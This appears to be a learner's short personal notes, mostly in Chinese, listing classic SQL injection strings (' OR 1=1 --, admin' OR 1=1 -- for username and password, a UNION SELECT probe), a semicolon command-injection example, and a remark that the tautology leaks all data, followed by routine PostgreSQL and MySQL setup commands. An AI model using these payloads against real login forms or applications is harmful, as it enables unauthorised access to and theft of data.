1. 最最最常见且有效的SQL注入命令是:
# ' OR 1 = 1 --
5. SQL注入 例子:
   user         admin' OR 1=1 --
   pass         admin' OR 1=1 --
# 'UNION SELECT 1, 2, 3--  pass is the same
3. 命令行注入, 用分号:
　　ls -a ; ls -l
4.  MySQL 中 "facebook " == "facebook"
５．' or 1=1',  leak all data, 有机会再试试看

postgresql
1. start server
sudo systemctl status postgresql
sudo systemctl unmask postgresql
sudo systemctl restart postgresql
sudo su - postgres


mysql
1. sudo apt install mysql-server mysql-workbench
2. mysql-workbench 			launch
3.
